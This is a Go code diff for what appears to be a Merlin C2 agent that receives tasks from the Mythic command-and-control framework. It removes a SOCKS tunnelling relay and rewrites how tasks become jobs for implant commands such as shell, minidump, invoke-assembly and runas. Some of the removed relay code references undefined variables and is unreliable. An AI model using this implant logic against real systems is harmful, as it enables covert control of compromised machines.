@@ -26,7 +26,6 @@ import (
 	"fmt"
 	"net"
 	"os"
-	"io"
 	"runtime"
 	"strings"
 	"sync"
@@ -52,8 +51,6 @@ type PubSubClient struct {
 	pendingJobs []messages.Base
 	mu          sync.Mutex
 	running     bool
-	socksConnections map[string]net.Conn // Tracks ID to active net.Conn
-     socksMutex       sync.Mutex
 
 	// Encryption settings
 	encryptionMode  string // "aes256_hmac", "rsa", or "none"
@@ -125,7 +122,6 @@ func NewPubSubClient(cfg *Config, agentID string, pskB64 string, encMode string)
 		running:        false,
 		encryptionMode: encMode,
 		psk:            pskKey,
-		socksConnections: make(map[string]net.Conn),
 	}
 
 	return client, nil
@@ -485,82 +481,6 @@ func min(a, b int) int {
 	return b
 }
 
-func (p *PubSubClient) handleSocks(s jobs.Socks, taskID string) {
-	p.socksMutex.Lock()
-	conn, exists := p.socksConnections[s.ID]
-	p.socksMutex.Unlock()
-
-	// 1. Close connection if requested
-	if s.Exit && exists {
-		conn.Close()
-		p.socksMutex.Lock()
-		delete(p.socksConnections, s.ID)
-		p.socksMutex.Unlock()
-		return
-	}
-
-	// 2. New Connection Request
-	if !exists{
-		newConn, err := net.DialTimeout("tcp", target, 5*time.Second)
-
-		// Create response job object
-		respJob := jobs.Job{
-			ID:      taskID,
-			Type:    jobs.SOCKS,
-			AgentID: uuid.MustParse(p.agentID),
-		}
-
-		if err != nil {
-			respJob.Payload = jobs.Socks{ID: s.ID, Close: true}
-			p.Send(messages.Base{Type: messages.JOBS, Payload: []jobs.Job{respJob}})
-			return
-		}
-
-		p.socksMutex.Lock()
-		p.socksConnections[s.ID] = newConn
-		p.socksMutex.Unlock()
-
-		// MANDATORY: Signal success to Mythic to start Rx
-		respJob.Payload = jobs.Socks{ID: s.ID, Close: false}
-		p.Send(messages.Base{Type: messages.JOBS, Payload: []jobs.Job{respJob}})
-
-		// Start data relay from Target -> Mythic
-		go p.relaySocksToMythic(newConn, s.ID, taskID)
-		return
-	}
-
-	// 3. Data from Mythic -> Target
-	if exists && s.Data != "" {
-		raw, _ := base64.StdEncoding.DecodeString(s.Data)
-		conn.Write(raw)
-	}
-}
-
-// CHANGED: Added Data Relay
-func (p *PubSubClient) relaySocksToMythic(conn net.Conn, socksID uuid.UUID, taskID string) {
-	buf := make([]byte, 4096)
-	for {
-		n, err := conn.Read(buf)
-		if n > 0 {
-			respJob := jobs.Job{
-				ID:      taskID,
-				Type:    jobs.SOCKS,
-				AgentID: uuid.MustParse(p.agentID),
-				Payload: jobs.Socks{
-					ID:   socksID,
-					Data: base64.StdEncoding.EncodeToString(buf[:n]),
-				},
-			}
-			p.Send(messages.Base{Type: messages.JOBS, Payload: []jobs.Job{respJob}})
-		}
-		if err != nil {
-			respJob := jobs.Job{ID: taskID, Type: jobs.SOCKS, Payload: jobs.Socks{ID: socksID, Close: true}}
-			p.Send(messages.Base{Type: messages.JOBS, Payload: []jobs.Job{respJob}})
-			break
-		}
-	}
-}
-
 // convertMythicTasksToMerlin converts Mythic task format to Merlin messages.Base.
 func (p *PubSubClient) convertMythicTasksToMerlin(taskData map[string]interface{}) messages.Base {
 	base := messages.Base{
@@ -590,22 +510,56 @@ func (p *PubSubClient) convertMythicTasksToMerlin(taskData map[string]interface{
 		taskID, _ := taskMap["id"].(string)
 		commandStr, _ := taskMap["command"].(string)
 
+		// Try to parse parameters as a Job wrapper (set by container's SetManualArgs)
+		// Format: {"type":<int>,"payload":"<json-string>"}
 		var cmd jobs.Command
+		var jobType jobs.Type
+		var payload interface{}
+		var parsedFromWrapper bool
+
 		if paramsInterface, ok := taskMap["parameters"]; ok {
 			if paramsStr, ok := paramsInterface.(string); ok {
-				var paramsMap map[string]interface{}
-				if err := json.Unmarshal([]byte(paramsStr), &paramsMap); err == nil {
-					if payloadInterface, ok := paramsMap["payload"]; ok {
-						if payloadStr, ok := payloadInterface.(string); ok {
-							json.Unmarshal([]byte(payloadStr), &cmd)
-						} else if payloadMap, ok := payloadInterface.(map[string]interface{}); ok {
-							if c, ok := payloadMap["command"].(string); ok {
-								cmd.Command = c
-							}
-							if a, ok := payloadMap["args"].([]interface{}); ok {
-								for _, arg := range a {
-									if argStr, ok := arg.(string); ok {
-										cmd.Args = append(cmd.Args, argStr)
+				var wrapper struct {
+					Type    int    `json:"type"`
+					Payload string `json:"payload"`
+				}
+				if err := json.Unmarshal([]byte(paramsStr), &wrapper); err == nil && wrapper.Payload != "" {
+					parsedFromWrapper = true
+					jobType = jobs.Type(wrapper.Type)
+					switch jobType {
+					case jobs.SOCKS:
+						var s jobs.Socks
+						json.Unmarshal([]byte(wrapper.Payload), &s)
+						payload = s
+					case jobs.FILETRANSFER:
+						var ft jobs.FileTransfer
+						json.Unmarshal([]byte(wrapper.Payload), &ft)
+						payload = ft
+					default:
+						json.Unmarshal([]byte(wrapper.Payload), &cmd)
+						if cmd.Command == "" {
+							cmd.Command = commandStr
+						}
+						payload = cmd
+					}
+				}
+
+				// Fall back: parse as raw parameters map
+				if !parsedFromWrapper {
+					var paramsMap map[string]interface{}
+					if err := json.Unmarshal([]byte(paramsStr), &paramsMap); err == nil {
+						if payloadInterface, ok := paramsMap["payload"]; ok {
+							if payloadStr, ok := payloadInterface.(string); ok {
+								json.Unmarshal([]byte(payloadStr), &cmd)
+							} else if payloadMap, ok := payloadInterface.(map[string]interface{}); ok {
+								if c, ok := payloadMap["command"].(string); ok {
+									cmd.Command = c
+								}
+								if a, ok := payloadMap["args"].([]interface{}); ok {
+									for _, arg := range a {
+										if argStr, ok := arg.(string); ok {
+											cmd.Args = append(cmd.Args, argStr)
+										}
 									}
 								}
 							}
@@ -615,57 +569,39 @@ func (p *PubSubClient) convertMythicTasksToMerlin(taskData map[string]interface{
 			}
 		}
 
-		if cmd.Command == "" {
-			cmd.Command = commandStr
-		}
-
-		var jobType jobs.Type
-		switch strings.ToLower(cmd.Command) {
-		case "exit", "agentinfo", "ja3", "killdate", "maxretry", "padding", "parrot", "skew", "sleep", "initialize", "connect", "listener":
-			jobType = jobs.CONTROL
-		case "shell", "run", "exec":
-			jobType = jobs.CMD
-		case "ps", "pipes", "uptime", "netstat", "ssh", "token", "runas", "memory", "memfd", "link", "unlink":
-			jobType = jobs.MODULE
-		case "create-process", "minidump", "invoke-assembly", "load-assembly", "list-assembly":
-			jobType = jobs.MODULE
-		case "ls", "cd", "pwd", "rm", "env", "ifconfig", "killprocess", "nslookup", "touch", "sdelete":
-			jobType = jobs.NATIVE
-		case "socks":
-			jobType = jobs.SOCKS
-		case "download", "upload":
-			jobType = jobs.FILETRANSFER
-		default:
-			jobType = jobs.NATIVE
-		}
-
-		var payload interface{} = cmd
-		// Special handling for SOCKS jobs: unmarshal parameters into jobs.Socks
-		if jobType == jobs.SOCKS {
-			var socksParams jobs.Socks
-			// Try to extract parameters as string and unmarshal into jobs.Socks
-			if paramsInterface, ok := taskMap["parameters"]; ok {
-				if paramsStr, ok := paramsInterface.(string); ok {
-					// Try direct unmarshal
-					if err := json.Unmarshal([]byte(paramsStr), &socks); err != nil {
-						// If that fails, try to extract "payload" and unmarshal that
-						var paramsMap map[string]interface{}
-						if err := json.Unmarshal([]byte(paramsStr), &paramsMap); err == nil {
-							if payloadInterface, ok := paramsMap["payload"]; ok {
-								if payloadStr, ok := payloadInterface.(string); ok {
-									_ = json.Unmarshal([]byte(payloadStr), &socks)
-								} else if payloadMap, ok := payloadInterface.(map[string]interface{}); ok {
-									// Marshal and unmarshal to jobs.Socks
-									if b, err := json.Marshal(payloadMap); err == nil {
-										_ = json.Unmarshal(b, &socks)
-									}
-								}
-							}
-						}
-					}
-				}
+		if !parsedFromWrapper {
+			if cmd.Command == "" {
+				cmd.Command = commandStr
 			}
-			payload = socksParams
+
+			switch strings.ToLower(cmd.Command) {
+			case "exit", "agentinfo", "ja3", "killdate", "maxretry", "padding", "parrot", "skew", "sleep", "initialize", "connect", "listener":
+				jobType = jobs.CONTROL
+			case "shell", "run", "exec":
+				jobType = jobs.CMD
+			case "ps", "pipes", "uptime", "netstat", "ssh", "token", "runas", "memory", "memfd", "link", "unlink":
+				jobType = jobs.MODULE
+			case "create-process", "minidump", "invoke-assembly", "load-assembly", "list-assembly":
+				jobType = jobs.MODULE
+			case "ls", "cd", "pwd", "rm", "env", "ifconfig", "killprocess", "nslookup", "touch", "sdelete":
+				jobType = jobs.NATIVE
+			case "socks":
+				jobType = jobs.SOCKS
+			case "download", "upload":
+				jobType = jobs.FILETRANSFER
+			default:
+				jobType = jobs.NATIVE
+			}
+
+			// Set the correct payload type based on job type
+			switch jobType {
+			case jobs.SOCKS:
+				payload = jobs.Socks{}
+			case jobs.FILETRANSFER:
+				payload = jobs.FileTransfer{}
+			default:
+				payload = cmd
+			}
 		}
 
 		job := jobs.Job{
@@ -679,11 +615,7 @@ func (p *PubSubClient) convertMythicTasksToMerlin(taskData map[string]interface{
 		merlinJobs = append(merlinJobs, job)
 
 		if core.Debug {
-			if jobType == jobs.SOCKS {
-				color.Yellow(fmt.Sprintf("[DEBUG] Created SOCKS job: ID=%s, Payload=%+v", job.ID, job.Payload))
-			} else {
-				color.Yellow(fmt.Sprintf("[DEBUG] Created job: ID=%s, Command=%s, Args=%v", job.ID, cmd.Command, cmd.Args))
-			}
+			color.Yellow(fmt.Sprintf("[DEBUG] Created job: ID=%s, Command=%s, Args=%v", job.ID, cmd.Command, cmd.Args))
 		}
 	}
 
@@ -865,7 +797,7 @@ func (p *PubSubClient) convertToMythicFormat(msg messages.Base) map[string]inter
 	case messages.JOBS:
 		jobsArray, ok := msg.Payload.([]jobs.Job)
 		if ok && len(jobsArray) > 0 {
-			if jobsArray[0].Type == jobs.RESULT || jobsArray[0].Type == jobs.SOCKS || jobsArray[0].Type == jobs.AGENTINFO || jobsArray[0].Type == jobs.FILETRANSFER {
+			if jobsArray[0].Type == jobs.RESULT || jobsArray[0].Type == jobs.AGENTINFO || jobsArray[0].Type == jobs.FILETRANSFER {
 				mythicMsg["action"] = "post_response"
 
 				responses := make([]interface{}, 0, len(jobsArray))
@@ -885,14 +817,6 @@ func (p *PubSubClient) convertToMythicFormat(msg messages.Base) map[string]inter
 						}
 						response["completed"] = true
 						response["status"] = "success"
-					case jobs.SOCKS:
-						s := job.Payload.(jobs.Socks)
-						response["socks"] = map[string]interface{}{
-							"id":      s.ID.String(),
-							"data":    s.Data,
-							"exit":    s.Close,
-							"success": s.Success,
-						}
 					case jobs.AGENTINFO:
 						infoBytes, _ := json.Marshal(job.Payload)
 						response["user_output"] = string(infoBytes)
@@ -912,6 +836,7 @@ func (p *PubSubClient) convertToMythicFormat(msg messages.Base) map[string]inter
 						response["completed"] = true
 						response["status"] = "success"
 					}
+
 					responses = append(responses, response)
 				}
 
